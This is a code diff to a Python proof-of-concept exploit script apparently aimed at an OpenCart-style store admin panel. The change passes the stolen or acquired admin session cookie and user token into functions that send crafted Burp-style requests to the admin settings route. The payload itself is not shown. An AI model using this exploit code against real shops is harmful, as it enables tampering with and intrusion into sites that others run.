@@ -67,7 +67,7 @@ def setfile(adcookies,adtoken):
     return set1
 
     
-def setdownload():
+def setdownload(adcookies,adtoken):
     burp0_url = "https://"+host+":443//admin/index.php?route=setting/setting&user_token="+adtoken
     burp0_cookies = {"OCSESSID": adcookies, "__atuvc": "1%7C12", "currency": "EUR", "language": "en-gb"}
     burp0_headers = {"Referer": "https://"+host+"/admin/index.php?route=setting/setting&user_token="+adtoken, "Cache-Control": "max-age=0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "Content-Type": "multipart/form-data; boundary=---------------------------7e417d361064c", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
@@ -86,8 +86,8 @@ if __name__ == "__main__":
     print(adcookies)
     print(adtoken)   
     addfile(adcookies,adtoken)
-    n1=setfile()
-    n2=setdownload()
+    n1=setfile(adcookies,adtoken)
+    n2=setdownload(adcookies,adtoken)
     print("poc run ")
     
     # if (n1==200 and n2==200):
